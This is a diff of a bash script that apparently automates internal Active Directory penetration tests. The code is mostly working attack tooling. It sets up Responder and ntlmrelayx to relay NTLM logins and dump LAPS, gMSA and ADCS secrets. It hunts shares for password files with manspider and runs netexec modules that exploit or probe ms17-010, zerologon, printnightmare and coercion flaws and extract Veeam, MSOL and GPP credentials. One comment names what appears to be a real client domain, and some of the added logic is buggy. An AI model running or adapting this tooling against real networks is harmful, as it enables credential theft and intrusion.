@@ -55,7 +55,7 @@ starter() {
 	excluded_hosts="$(ip -o -4 addr show $INTERFACE | awk '{print $4}' | cut -d'/' -f1)"
 	RDP_TIMEOUT=7
 	CME_TIMEOUT=15 #increase in case of slow network
-	SNMP_TIMEOUT=5
+	SNMP_TIMEOUT=3
 	SPACE='   '
 	
 	################### RENAME TAB ##############################
@@ -94,7 +94,6 @@ EOF
 	fi
 	banner
 	pop_logger
-	check_live_hosts
 }
 
 ######################## 	LOG FUNCTIONS  ##########################
@@ -148,46 +147,83 @@ pop_logger () {
 	sleep 1
 }
 
-################### Check HOSTS UP 	#########################
-check_live_hosts() {
-	#### CALCUL DES IP ####
-	MY_IP=$(ip -o -4 addr show $INTERFACE | awk '{print $4}' | cut -d'/' -f1)
-	MY_IP_WITH_MASK=$(ip -o -4 addr show $INTERFACE | awk '{print $4}' | cut -f1)
-	# Calculer l'adresse réseau pour arp discovery
-	NETWORK_LAN=$(ipcalc -n -b $MY_IP_WITH_MASK | grep "Network:" | awk '{print $2}')
-	NETWORK_LAN_BROADCAST=$(ipcalc -n -b $MY_IP_WITH_MASK | grep "Broadcast:" | awk '{print $2}')
-	
-	TARGET_LAN=$(ipcalc -n -b $rangeIP  | grep "Network:" | awk '{print $2}')
-	TARGET_LAN_BROADCAST=$(ipcalc -n -b $rangeIP | grep "Broadcast:" | awk '{print $2}')
-	
-	# Convert IP addresses to integers for comparison
-	ip_to_int() {
-		local a b c d
-		IFS=. read -r a b c d <<< "$1"
-		echo $((a * 256**3 + b * 256**2 + c * 256 + d))
-	}
-	
-	network_start=$(ip_to_int "$NETWORK_LAN")
-	network_end=$(ip_to_int "$NETWORK_LAN_BROADCAST")
-	target_start=$(ip_to_int "$TARGET_LAN")
-	target_end=$(ip_to_int "$TARGET_LAN_BROADCAST")
-	
-	#If attack range is into the selected network interface
-	if [[ $network_start -le $target_start && $network_end -ge $target_end ]]; then
-		nmap -PR -sn $rangeIP | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v $MY_IP > $DIR/tmp_hosts.txt 2>&1
-		#S'assurer que les excluded hosts ne sont pas inclu dans hosts.txt
-		grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' $DIR/tmp_hosts.txt > $DIR/hosts.txt
-		rm $DIR/tmp_hosts.txt
-		NMAP_HOSTS="-iL $DIR/hosts.txt"
-		log "[!] Alive targets file created : $DIR/hosts.txt"
-	else
-		NMAP_HOSTS="$rangeIP"
-	fi
+control_ip_attack() {
+	TARGET_IP="$ip"
+	rangeIP_array=$(echo "$rangeIP" | tr ',' '\n')
+	for rangeIP_array_key in $rangeIP_array; do
+		NETWORK_LAN=$(ipcalc -n -b $rangeIP_array_key | grep "Address:" | awk '{print $2}')
+		NETWORK_LAN_BROADCAST=$(ipcalc -n -b $rangeIP_array_key | grep "Broadcast:" | awk '{print $2}')
+		# Fonction pour convertir les adresses IP en entiers
+		ip_to_int() {
+			local a b c d
+			IFS=. read -r a b c d <<< "$1"
+			echo $((a * 256**3 + b * 256**2 + c * 256 + d))
+		}
+		# Convertir les adresses en entiers
+		network_start=$(ip_to_int "$NETWORK_LAN")
+		network_end=$(ip_to_int "$NETWORK_LAN_BROADCAST")
+		target_ip_int=$(ip_to_int "$TARGET_IP")
+
+		# Vérifier si l'IP cible est dans la plage
+		if [[ $network_start -le $target_ip_int && $network_end -ge $target_ip_int ]]; then
+			return 0
+		fi
+	done
+	return 1
 }
 
 ########################### FAST SCAN NMAP #####################################
 nmap_fast () {
-	NMAPPATH=$DIR/scan_nmap
+	
+	#### CALCUL DES IP ####
+	MY_IP=$(ip -o -4 addr show $INTERFACE | awk '{print $4}' | cut -d'/' -f1)
+	MY_IP_WITH_MASK=$(ip -o -4 addr show $INTERFACE | awk '{print $4}' | cut -f1)
+	# Calculer l'adresse réseau pour arp discovery
+	NETWORK_LAN=$(ipcalc -n -b $MY_IP_WITH_MASK | grep "Address:" | awk '{print $2}')
+	NETWORK_LAN_BROADCAST=$(ipcalc -n -b $MY_IP_WITH_MASK | grep "Broadcast:" | awk '{print $2}')
+	
+	log "[!] Discovery mode : '$discovery_mode'"
+	
+	#If the discovery must be by ping requests :
+	if [[ $discovery_mode == "arp-ping" ]]; then ### A DEFINIR
+		rangeIP_array=$(echo "$rangeIP" | tr ',' '\n')
+		for rangeIP_array_key in $rangeIP_array; do
+			echo "Starting scan : $rangeIP_array_key"
+			if echo $rangeIP_array_key | grep -vq "/32"; then
+				TARGET_LAN=$(ipcalc -n -b $rangeIP_array_key  | grep "Network:" | awk '{print $2}')
+				TARGET_LAN_BROADCAST=$(ipcalc -n -b $rangeIP_array_key | grep "Broadcast:" | awk '{print $2}')
+			else
+				TARGET_LAN=$(ipcalc -n -b $rangeIP_array_key  | grep "Address:" | awk '{print $2}')
+				TARGET_LAN_BROADCAST=$TARGET_LAN
+			fi
+			# Convert IP addresses to integers for comparison
+			ip_to_int() {
+				local a b c d
+				IFS=. read -r a b c d <<< "$1"
+				echo $((a * 256**3 + b * 256**2 + c * 256 + d))
+			}
+			network_start=$(ip_to_int "$NETWORK_LAN")
+			network_end=$(ip_to_int "$NETWORK_LAN_BROADCAST")
+			target_start=$(ip_to_int "$TARGET_LAN")
+			target_end=$(ip_to_int "$TARGET_LAN_BROADCAST")
+			
+			#If attack range is into the selected network interface
+			if [[ $network_start -le $target_start && $network_end -ge $target_end ]]; then
+				#ARP Scan
+				#S'assurer que les excluded hosts ne sont pas inclu dans hosts.txt
+				nmap -PR -sn $rangeIP_array_key | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v $MY_IP > $DIR/tmp_hosts.txt 2>&1
+				grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' $DIR/tmp_hosts.txt >> $DIR/hosts.txt
+				rm $DIR/tmp_hosts.txt
+			else
+				fping -g $rangeIP_array_key --alive | grep -v $MY_IP >> $DIR/hosts.txt 2>/dev/null
+			fi
+		done
+		NMAP_HOSTS="-Pn -iL $DIR/hosts.txt"
+		log "${SPACE}[!] $(wc -l $DIR/hosts.txt) hosts detected via arp / ping"
+	else
+		NMAP_HOSTS=$(echo "$rangeIP" | tr ',' ' ')
+	fi
+	
 	log "[🔍] Scanning NMAP - Fast version"
 	#Fast NMAP TCP
 	if [ -n "$proxychains" ]; then
@@ -201,38 +237,69 @@ nmap_fast () {
 		log "Press Entrer when ready ..."
 		read
 	else
-		log "${SPACE}[📂] TCP ..."
+		log "${SPACE}[📂] TCP Scanning ..."
 		#Si pas proxychains, sS pour TCP
 		#ports=$(nmap -p- --min-rate=1000 -T4 $target | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//); echo "nmap -p $ports -sT -sV -T4 -R $target"; nmap -p $ports -sT -sV -T4 -R $target
-		nmap -Pn $NMAP_HOSTS -sS -T4 -oA $DIR/scan_nmap/scan_TCP_ports --open --exclude $excluded_hosts >/dev/null 2>&1
+		NMAP_HOSTS="-iL $DIR/hosts.txt"
+		nmap $NMAP_HOSTS -sS -T4 -oA $DIR/scan_nmap/scan_TCP_ports --open --exclude $excluded_hosts >/dev/null 2>&1
 		ports=$(grep -oP '^\d{1,5}/(tcp|udp)' $DIR/scan_nmap/scan_TCP_ports.nmap | awk -F'/' '{print $1}' | sort -u | paste -sd, -)
-		nmap -Pn $NMAP_HOSTS -sS -sV -T4 -p $ports -oA $DIR/scan_nmap/scan_Fast_TCP --open --exclude $excluded_hosts >/dev/null 2>&1
+		nmap $NMAP_HOSTS -sS -sV -T4 -p $ports -oA $DIR/scan_nmap/scan_Fast_TCP --open --exclude $excluded_hosts >/dev/null 2>&1
 		#log "${SPACE}[!] Nmap TCP report : ${DIR}/scan_nmap/scan_Fast_TCP.nmap"
-		log "${SPACE}[📂] UDP ..."
+		log "${SPACE}[📂] UDP Scanning ..."
 		#UDP
 		nmap -Pn -sU $NMAP_HOSTS -R -oA $DIR/scan_nmap/scan_Full_UDP --open --top 25 -T4 --exclude $excluded_hosts >/dev/null 2>&1
 	fi
 	
-	#Compilation TCP + UDP report
-	cat ${DIR}/scan_nmap/scan_Full_UDP_open.nmap $DIR/scan_nmap/scan_Fast_TCP.nmap > $DIR/scan_nmap/scan_Full_Fast.nmap 
 	#log "${SPACE}[!] Nmap UDP report : ${DIR}/scan_nmap/scan_Full_UDP.nmap"
 	
 	#Convert to html
+	#TCP
 	sed -i 's/href="nmap\.xsl/href="file:\/\/\/usr\/bin\/\.\.\/share\/nmap\/nmap\.xsl/g' $DIR/scan_nmap/scan_Fast_TCP.xml
 	xsltproc $DIR/scan_nmap/scan_Fast_TCP.xml -o /tmp/scan_Fast_TCP.html
 	log "${SPACE}[!] Nmap TCP report in HTML format : /tmp/scan_Fast_TCP.html"
 	
+	#UDP
 	cat ${DIR}/scan_nmap/scan_Full_UDP.nmap | grep -v "open|filtered" > ${DIR}/scan_nmap/scan_Full_UDP_open.nmap
 	sed -i 's/href="nmap\.xsl/href="file:\/\/\/usr\/bin\/\.\.\/share\/nmap\/nmap\.xsl/g' $DIR/scan_nmap/scan_Full_UDP.xml
-	echo "xsltproc $DIR/scan_nmap/scan_Full_UDP.xml -o /tmp/scan_Full_UDP.html"
-	xsltproc $DIR/scan_nmap/scan_Full_UDP.xml -o /tmp/scan_Full_UDP.html
+	#Delete ip block without explicit opened port (for better lisibility in html)
+	awk '
+	/<host / {
+		in_block = 1;
+		block = $0;
+		has_open = 0;
+		next
+	}
+	/<\/host>/ {
+		block = block $0
+		if (has_open) {
+			print block
+		}
+		in_block = 0
+		next
+	}
+	/<port .*state="open"/ {
+		has_open = 1
+	}
+	{
+		if (in_block) {
+			block = block $0 "\n"
+		} else {
+			print
+		}
+	}
+	' "$DIR/scan_nmap/scan_Full_UDP.xml" > "$DIR/scan_nmap/scan_Full_UDP_filtered.xml"
+	xsltproc $DIR/scan_nmap/scan_Full_UDP_filtered.xml -o /tmp/scan_Full_UDP.html
 	#Suppression des filtered|opened
 	awk 'BEGIN { RS="</tr>" } /open\|filtered/ { next } { printf "%s", $0 "</tr>" }' /tmp/scan_Full_UDP.html > /tmp/scan_Full_UDP_open.html
-	log "${SPACE}[!] Nmap UDP report in HTML format : /tmp/scan_Full_UDP.html"
+	log "${SPACE}[!] Nmap UDP report in HTML format : /tmp/scan_Full_UDP_open.html"
+	
 	#Extracting IP from the 2 reports
 	grep -i 'Nmap scan report for' "${DIR}/scan_nmap/scan_Fast_TCP.nmap" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' >> ${DIR}/hosts.txt
 	grep -i 'Nmap scan report for' "${DIR}/scan_nmap/scan_Full_UDP.nmap" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' >> ${DIR}/hosts.txt
-
+	
+	#Compilation TCP + UDP report
+	cat ${DIR}/scan_nmap/scan_Full_UDP_open.nmap $DIR/scan_nmap/scan_Fast_TCP.nmap > $DIR/scan_nmap/scan_Full_Fast.nmap 
+	
 	sort -u ${DIR}/hosts.txt -o ${DIR}/hosts.txt
 
 	log "${SPACE}[!] NMAP scan detected $(wc -l "$DIR/hosts.txt" | awk '{print $1}') machines"
@@ -360,27 +427,31 @@ relay () {
 		green_log "${SPACE}[💀] Found $nb_relay_vulnerable devices vulnerable to NTLM relay in the $rangeIP network -> $DIR_VULNS/NTLM_relay/ntlm-relay-list.txt"
 		#If prochains isn't enabled then try to catch something with responder and ntlmrelay
 		if [ -z "$proxychains" ];then
-			#Turn off all settings before "Custom challenge" on responder config file
+			#Turn off SMB,HTTP and HTTPS server on Responder.conf file
 			responder_file="/usr/share/responder/Responder.conf"
-			sed '/^; Custom challenge/,$!s/= Off/= On/' "$responder_file"
+			sed -i '/^\s*SMB\s*=\s*On/s/= On/= Off/; /^\s*HTTPS\s*=\s*On/s/= On/= Off/; /^\s*HTTP\s*=\s*On/s/= On/= Off/' "$responder_file"
 			#Configure proxychains port 1080 (ntlmrelayx) and dynamic_chain (to have possibility of multiples socks)
-			responder_file="/etc/proxychains.conf"
+			responder_file="/etc/proxychains4.conf"
 			sed -i '/^strict_chain/s/^/#/' "$config_file"
 			sed -i '/^random_chain/s/^/#/' "$config_file"
 			sed -i '/^#.*dynamic_chain/s/^#//' "$config_file"
 			grep -q "^socks.* 127.0.0.1 1080" "$config_file" || echo 'socks4  127.0.0.1 1080' >> "$config_file"
-			responder -I eth0 -bd --wpad --lm --disable-ess -v; exec bash
+			#responder -I eth0 -bd --wpad --lm --disable-ess -v; exec bash
+			if ! which ntlmrelayx.py >/dev/null 2>&1 && ! which ntlmrelayx >/dev/null 2>&1; then
+				cp /usr/share/doc/python3-impacket/examples/ntlmrelayx.py /usr/bin/
+				chmod +x /usr/bin/ntlmrelayx.py
+			fi
 			if  which terminator > /dev/null 2>&1;then
 				#terminator --new-tab -m -e "tail -F /root/test" &
 				terminator --new-tab -m -e "source /tmp/set_title_tab.sh Responder; responder -I ${INTERFACE} -bd --wpad --lm --disable-ess -v; sleep 5d" &
 				sleep 1
-				terminator --new-tab -m -e "source /tmp/set_title_tab.sh RelayNTLM; /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf $DIR_VULNS/NTLM_relay/ntlm-relay-list.txt -smb2support -socks --output-file $DIR_VULNS/NTLM_relay/ --dump-laps --dump-gmsa --dump-adcs; sleep 5d" &
+				terminator --new-tab -m -e "source /tmp/set_title_tab.sh RelayNTLM; ntlmrelayx.py -tf $DIR_VULNS/NTLM_relay/ntlm-relay-list.txt -smb2support -socks --output-file $DIR_VULNS/NTLM_relay/ --dump-laps --dump-gmsa --dump-adcs; sleep 5d" &
 			else
 				#export QT_QPA_PLATFORM=offscreen 
 				#qterminal -e "tail -F $logfile" &
 				x-terminal-emulator -e "source /tmp/set_title_tab.sh Responder; responder -I ${INTERFACE} -bd --wpad --lm --disable-ess -v; sleep 5d" &
 				sleep 1
-				x-terminal-emulator -e "source /tmp/set_title_tab.sh RelayNTLM; /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf $DIR_VULNS/ntlm-relay-list.txt -smb2support -socks --output-file $DIR_VULNS/NTLM_relay/ --dump-laps --dump-gmsa --dump-adcs; sleep 5d" &
+				x-terminal-emulator -e "source /tmp/set_title_tab.sh RelayNTLM; ntlmrelayx.py -tf $DIR_VULNS/ntlm-relay-list.txt -smb2support -socks --output-file $DIR_VULNS/NTLM_relay/ --dump-laps --dump-gmsa --dump-adcs; sleep 5d" &
 			fi
 			green_log "${SPACE}[💀] NTLM Relay started, look at socks and folder $DIR_VULNS/NTLM_relay/ for user's netNTLM hashes"
 		else
@@ -401,14 +472,15 @@ manspider () {
 		wordlist="confiden classified bastion '\bcode\w*' creds credential wifi hash ntlm '\bidentifiant\w*' compte utilisateur '\buser\w*' '\b\$.*pass\w*' '\root\w*' '\b\$.*admin\w*' '\badmin\w*' account login 'cpassword\w*' 'pass\w*' cred '\b\$.*pass\w*' cisco pfsense pfx ppk rsa ssh rsa '\bcard\w*' '\bcarte\w*' '\bidentite\w*' '\bidentité\w*' '\bpasseport\w*'"
 		exclusions="--exclude-dirnames AppData --exclude-extensions DAT LOG2 LOG1 lnk msi"
 		request_manspider="$proxychains manspider -n -s $max_size_files_checked -t $threads -c $wordlist $exclusions"
+		manspider_ip=$(cat ${DIR_PORTS}/445.txt | paste -sd " ")
 		log "[🔍] Launching manspider"
 		log "[!]  If kerberos only : Netexec spider !"
 		if  which terminator > /dev/null 2>&1;then
-			terminator --new-tab -m -e "source /tmp/set_title_tab.sh Manspider; $request_manspider -u $Username $cme_creds $rangeIP; sleep 5d" &
+			terminator --new-tab -m -e "source /tmp/set_title_tab.sh Manspider; $request_manspider -u $Username $cme_creds $manspider_ip; sleep 5d" &
 		else
 			#export QT_QPA_PLATFORM=offscreen 
 			#qterminal -e "tail -F $logfile" &
-			qterminal -e bash -c "source /tmp/set_title_tab.sh Manspider; $request_manspider -u $Username $cme_creds $rangeIP; sleep 5d" &
+			qterminal -e bash -c "source /tmp/set_title_tab.sh Manspider; $request_manspider -u $Username $cme_creds $manspider_ip; sleep 5d" &
 		fi
 	fi
 }
@@ -419,93 +491,126 @@ vulns () {
 	log "[🔍] Starting vulnerabilty scans on all devices"
 	if [[ "$Username" != "anonymous" ]];then
 		#smb_modules_devices=(coerce_plus ms17-010 zerologon spooler webdav install_elevated gpp_password gpp_autologin enum_av enumdns veeam msol)
-		smb_modules_devices=(spooler webdav install_elevated gpp_password gpp_autologin enum_av enumdns veeam msol)
+		smb_modules_devices=(ms17-010 zerologon smbghost printnightmare coerce_plus spooler webdav install_elevated gpp_password gpp_autologin enum_av enumdns veeam msol)
 	else
 		smb_modules_devices=""
 	fi
-	smb_modules_devices_anonymous=(ms17-010 zerologon petitpotam)
+	smb_modules_devices_anonymous=(ms17-010 zerologon smbghost printnightmare coerce_plus)
 	Devices=$(cat $DIR/ports/445.txt)
 	
 	for module in ${smb_modules_devices_anonymous[@]};do
+		log "${SPACE}[👁️ ] Checking $module vulnerabilies ..."
 		for ip in $Devices; do
-			host=${ip}
-			hostname=$(grep -E "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
-			$proxychains timeout $CME_TIMEOUT netexec smb $host -u '' -p '' -M $module < /dev/null > $DIR_VULNS/Vulns_Device_anonymous_${ip}_$module.txt 2>/dev/null
-			#cat $DIR_VULNS/Vulns_Device_tmp_$module.txt
-			if [[ "$module" == "ms17-010" || "$module" == "zerologon" || "$module" == "petitpotam"  ]] && grep -Eqio "vulnerable" $DIR_VULNS/Vulns_Device_anonymous_${ip}_$module.txt;then
-				green_log "${SPACE}[💀] Vulnerabilty '$module' via anonymous login found on $ip ($hostname) ! -> $DIR_VULNS/Vulns_Device_anonymous_${ip}_$module.txt"
+			if control_ip_attack; then
+				host=${ip}
+				hostname=$(grep -E "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
+				$proxychains timeout $CME_TIMEOUT netexec smb $host -u '' -p '' -M $module < /dev/null > $DIR_VULNS/Vulns_Device_anonymous_${ip}_$module.txt 2>/dev/null
+				#cat $DIR_VULNS/Vulns_Device_tmp_$module.txt
+				if ! grep -Eqio "Unable to detect|does NOT appear vulnerable" $DIR_VULNS/Vulns_Device_anonymous_${ip}_$module.txt && grep -Eqio "vulnerable" $DIR_VULNS/Vulns_Device_anonymous_${ip}_$module.txt;then
+					if grep -Eqio "COERCE_PLUS" "$DIR_VULNS/Vulns_Device_anonymous_${ip}_$module.txt" && grep -Eqio "vulnerable" "$DIR_VULNS/Vulns_Device_anonymous_${ip}_$module.txt"; then
+						coerce_vulns=$(cat $DIR_VULNS/Vulns_Device_anonymous_${ip}_$module.txt | grep -i "COERCE_PLUS" | awk -F ", " '{print $2}')
+						for coerce_vulns_key in $coerce_vulns; do
+							green_log "${SPACE}${SPACE}[💀] Vulnerabilty '$coerce_vulns_key' via anonymous login found on $ip ($hostname) ! -> $DIR_VULNS/Vulns_Device_anonymous_${ip}_$module.txt"
+							echo $ip >> "$DIR_VULNS/Vulns_Devices_$coerce_vulns_key.txt"
+						done
+					elif ! grep -Eqio "COERCE_PLUS" $DIR_VULNS/Vulns_Device_anonymous_${ip}_$module.txt; then
+						green_log "${SPACE}${SPACE}[💀] Vulnerabilty '$module' via anonymous login found on $ip ($hostname) ! -> $DIR_VULNS/Vulns_Device_anonymous_${ip}_$module.txt"
+						echo $ip >> "$DIR_VULNS/Vulns_Devices_$module.txt"
+					fi
+				fi
 			fi
 		done
 	done
 	
 	for module in ${smb_modules_devices[@]};do
-		if [[ "$module" == "coerce_plus" ]]; then
-			option_vulns="-o LISTENER=$(ip -o -4 addr show $INTERFACE | awk '{print $4}' | cut -d'/' -f1)"
-		else
-			option_vulns=""
-		fi
+		log "${SPACE}[👁️ ] Checking $module vulnerabilies ..."
+		#if [[ "$module" == "coerce_plus" ]]; then
+		#	option_vulns="-o LISTENER=$(ip -o -4 addr show $INTERFACE | awk '{print $4}' | cut -d'/' -f1)"
+		#else
+		#	option_vulns=""
+		#fi
 		for ip in $Devices; do
-			host=${ip}
-			hostname=$(grep -E "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
-			$proxychains timeout $CME_TIMEOUT netexec smb $host -u $Username $cme_creds -M $module $option_vulns < /dev/null > $DIR_VULNS/Vulns_Device_${ip}_$module.txt 2>/dev/null
-			#cat $DIR_VULNS/Vulns_Device_tmp_$module.txt
-			if grep -Eqo "STATUS_NOT_SUPPORTED|Failed to authenticate the user .* with ntlm" $DIR_VULNS/Vulns_Device_${ip}_$module.txt;then
-				if [[ -z $hostname ]];then
-					kerberos="-d $(echo "$hostname" | cut -d '.' -f 2-) --kerberos"
-					host="$(echo $hostname | cut -d '.' -f 1)"
+			if control_ip_attack; then
+				host=${ip}
+				hostname=$(grep -E "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
+				$proxychains timeout $CME_TIMEOUT netexec smb $host -u $Username $cme_creds -M $module $option_vulns < /dev/null > $DIR_VULNS/Vulns_Device_${ip}_$module.txt 2>/dev/null
+				#grep -L "Exception while" ${DIR_VULNS}/* | xargs cat | grep -Ev 'SMBv|STATUS_ACCESS_DENIED|Unable to detect|does NOT appear|sodebo\.fr\\:|Error while|STATUS_LOGON_FAILURE'
+				if grep -Eqo "STATUS_NOT_SUPPORTED|Failed to authenticate the user .* with ntlm" $DIR_VULNS/Vulns_Device_${ip}_$module.txt;then
+					if [[ -z $hostname ]];then
+						kerberos="-d $(echo "$hostname" | cut -d '.' -f 2-) --kerberos"
+						host="$(echo $hostname | cut -d '.' -f 1)"
+					fi
+					$proxychains timeout $CME_TIMEOUT netexec smb $host -u $Username $cme_creds $kerberos -M $module $option_vulns < /dev/null > $DIR_VULNS/Vulns_Device_${ip}_$module.txt 2>/dev/null
 				fi
-				$proxychains timeout $CME_TIMEOUT netexec smb $host -u $Username $cme_creds $kerberos -M $module $option_vulns < /dev/null > $DIR_VULNS/Vulns_Device_${ip}_$module.txt 2>/dev/null
+				if [[ "$module" == "ms17-010" || "$module" == "zerologon" || "$module" == "petitpotam" || "$module" == "nopac" ]] && ! grep -Eqio "Unable to detect|does NOT appear vulnerable" $DIR_VULNS/Vulns_Device_${ip}_$module.txt && grep -Eqio "vulnerable" $DIR_VULNS/Vulns_Device_${ip}_$module.txt;then
+					green_log "${SPACE}${SPACE}[💀] Vulnerabilty '$module' found on $ip ($hostname) ! -> $DIR_VULNS/Vulns_Device_${ip}_$module.txt"
+					echo $ip >> "$DIR_VULNS/Vulns_Devices_$module.txt"
+				elif [[ "$module" == "gpp_password" || "$module" == "gpp_password" ]] && grep -Eqio "Found credentials" $DIR_VULNS/Vulns_Device_${ip}_$module.txt;then
+					green_log "${SPACE}${SPACE}[💀] Vulnerabilty '$module' found on $ip ($hostname) ! -> $DIR_VULNS/Vulns_Device_${ip}_$module.txt"
+					echo $ip >> "$DIR_VULNS/Vulns_Devices_$module.txt"
+				elif [[ "$module" == "webdav" || "$module" == "spooler" ]] && grep -Eqio "$module" $DIR_VULNS/Vulns_Device_${ip}_$module.txt;then
+					green_log "${SPACE}${SPACE}[💀] $module found on $ip ($hostname) ! -> $DIR_VULNS/Vulns_Device_${ip}_$module.txt"
+					echo $ip >> "$DIR_VULNS/Vulns_Devices_$module.txt"
+				elif [[ "$module" == "install_elevated" ]] && grep -Eqio "Enabled" $DIR_VULNS/Vulns_Device_${ip}_$module.txt;then
+					green_log "${SPACE}${SPACE}[💀] install_elevated vulnérability found on $ip ($hostname) ! -> $DIR_VULNS/Vulns_Device_${ip}_$module.txt"
+					echo $ip >> "$DIR_VULNS/Vulns_Devices_$module.txt"
+				elif [[ "$module" == "enum_av" ]] && grep -Eqio "enum_av" $DIR_VULNS/Vulns_Device_${ip}_$module.txt && ! grep -Eqio "Found NOTHING" $DIR_VULNS/Vulns_Device_${ip}_$module.txt;then
+					green_log "${SPACE}${SPACE}[💀] AV identified on $ip ($hostname) ! -> $DIR_VULNS/Vulns_Device_${ip}_$module.txt"
+					echo $ip >> "$DIR_VULNS/Vulns_Devices_$module.txt"
+				elif [[ "$module" == "enumdns" ]] && grep -Eqio "record" $DIR_VULNS/Vulns_Device_${ip}_$module.txt;then
+					green_log "${SPACE}${SPACE}[💀] DNS exfiltration done on $ip ($hostname) ! -> $DIR_VULNS/Vulns_Device_${ip}_$module.txt"
+					echo $ip >> "$DIR_VULNS/Vulns_Devices_$module.txt"
+				elif echo "$module" | grep -q "coerce_plus" &&  grep -Eqio "vulnerable" $DIR_VULNS/Vulns_Device_${ip}_$module.txt ;then
+					coerce_vulns=$(cat $DIR_VULNS/Vulns_Device_anonymous_${ip}_$module.txt | grep -i "COERCE_PLUS" | awk -F ", " '{print $2}')
+					for coerce_vulns_key in $coerce_vulns; do
+						green_log "${SPACE}${SPACE}[💀] Vulnerabilty '$coerce_vulns_key' found on $ip ($hostname) ! -> $DIR_VULNS/Vulns_Device_${ip}_$module.txt"
+						echo $ip >> "$DIR_VULNS/Vulns_Devices_$coerce_vulns_key.txt"
+					done
+				elif echo "$module" | grep -q "veeam" &&  grep -Eqio "Extracting stored credentials" $DIR_VULNS/Vulns_Device_${ip}_$module.txt ;then
+					green_log "${SPACE}${SPACE}[💀] At least 1 vulnerabilty found on $ip ($hostname) ! -> $DIR_VULNS/Vulns_Device_${ip}_$module.txt"
+					echo $ip >> "$DIR_VULNS/Vulns_Devices_$module.txt"
+				elif echo "$module" | grep -q "msol" &&  grep -Eqio "Executing the script" $DIR_VULNS/Vulns_Device_${ip}_$module.txt && ! grep -Eqio "Could not retrieve output file" $DIR_VULNS/Vulns_Device_${ip}_$module.txt;then
+					green_log "${SPACE}${SPACE}[💀] MSOL credentials could be find on $ip ($hostname) ! -> $DIR_VULNS/Vulns_Device_${ip}_$module.txt"
+					echo $ip >> "$DIR_VULNS/Vulns_Devices_$module.txt"
+				fi
 			fi
-			if [[ "$module" == "ms17-010" || "$module" == "zerologon" || "$module" == "petitpotam" || "$module" == "nopac" ]] && grep -Eqio "vulnerable" $DIR_VULNS/Vulns_Device_${ip}_$module.txt;then
-				green_log "${SPACE}[💀] Vulnerabilty '$module' found on $ip ($hostname) ! -> $DIR_VULNS/Vulns_Device_${ip}_$module.txt"
-			elif [[ "$module" == "gpp_password" || "$module" == "gpp_password" ]] && grep -Eqio "Found credentials" $DIR_VULNS/Vulns_Device_${ip}_$module.txt;then
-				green_log "${SPACE}[💀] Vulnerabilty '$module' found on $ip ($hostname) ! -> $DIR_VULNS/Vulns_Device_${ip}_$module.txt"
-			elif [[ "$module" == "webdav" || "$module" == "spooler" ]] && grep -Eqio "$module" $DIR_VULNS/Vulns_Device_${ip}_$module.txt;then
-				green_log "${SPACE}[💀] $module found on $ip ($hostname) ! -> $DIR_VULNS/Vulns_Device_${ip}_$module.txt"
-			elif [[ "$module" == "install_elevated" ]] && grep -Eqio "Pwn3d!" $DIR_VULNS/Vulns_Device_${ip}_$module.txt && grep -Eqio "Enabled" $DIR_VULNS/Vulns_Device_${ip}_$module.txt;then
-				green_log "${SPACE}[💀] install_elevated vulnérability found on $ip ($hostname) ! -> $DIR_VULNS/Vulns_Device_${ip}_$module.txt"
-			elif [[ "$module" == "enum_av" ]] && grep -Eqio "enum_av" $DIR_VULNS/Vulns_Device_${ip}_$module.txt && ! grep -Eqio "Found NOTHING" $DIR_VULNS/Vulns_Device_${ip}_$module.txt;then
-				green_log "${SPACE}[💀] AV identified on $ip ($hostname) ! -> $DIR_VULNS/Vulns_Device_${ip}_$module.txt"
-			elif [[ "$module" == "enumdns" ]] && grep -Eqio "record" $DIR_VULNS/Vulns_Device_${ip}_$module.txt;then
-				green_log "${SPACE}[💀] DNS exfiltration done on $ip ($hostname) ! -> $DIR_VULNS/Vulns_Device_${ip}_$module.txt"
-			elif echo "$module" | grep -q "coerce_plus" &&  grep -Eqio "vulnerable" $DIR_VULNS/Vulns_Device_${ip}_$module.txt ;then
-				green_log "${SPACE}[💀] At least 1 vulnerabilty found on $ip ($hostname) ! -> $DIR_VULNS/Vulns_Device_${ip}_$module.txt"
-			elif echo "$module" | grep -q "veeam" &&  grep -Eqio "Extracting stored credentials" $DIR_VULNS/Vulns_Device_${ip}_$module.txt ;then
-				green_log "${SPACE}[💀] At least 1 vulnerabilty found on $ip ($hostname) ! -> $DIR_VULNS/Vulns_Device_${ip}_$module.txt"
-			elif echo "$module" | grep -q "msol" &&  grep -Eqio "Executing the script" $DIR_VULNS/Vulns_Device_${ip}_$module.txt && ! grep -Eqio "Could not retrieve output file" $DIR_VULNS/Vulns_Device_${ip}_$module.txt;then
-				green_log "${SPACE}[💀] MSOL credentials could be find on $ip ($hostname) ! -> $DIR_VULNS/Vulns_Device_${ip}_$module.txt"
-			fi				
-			
-			
 		done
+		if [ -n "$DIR_VULNS/Vulns_Devices_$module.txt" ]; then
+			green_log "${SPACE}${SPACE}[💀] MSOL credentials could be find on $ip ($hostname) ! -> $DIR_VULNS/Vulns_Device_${ip}_$module.txt"
+		fi
 	done
+	sort -u "$DIR_VULNS/Vulns_Devices_$module.txt" -o "$DIR_VULNS/Vulns_Devices_$module.txt"
 }
 
 ###################### FTP  ##########################
 ftp () {
 	if [ -e "$DIR_PORTS/21.txt" ]; then
 		# Lire le fichier 21.txt ligne par ligne
-		log "[🔍] Check FTP"
+		log "[🔍] Checking FTP"
 		
 		FTP=$(cat $DIR_PORTS/21.txt)
 		for ip in $FTP; do
-			hostname=$(grep -aE "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
-			log "${SPACE}[📂] Check for $ip ($hostname) ..."
-			# Essayer de se connecter à l'adresse IP via FTP
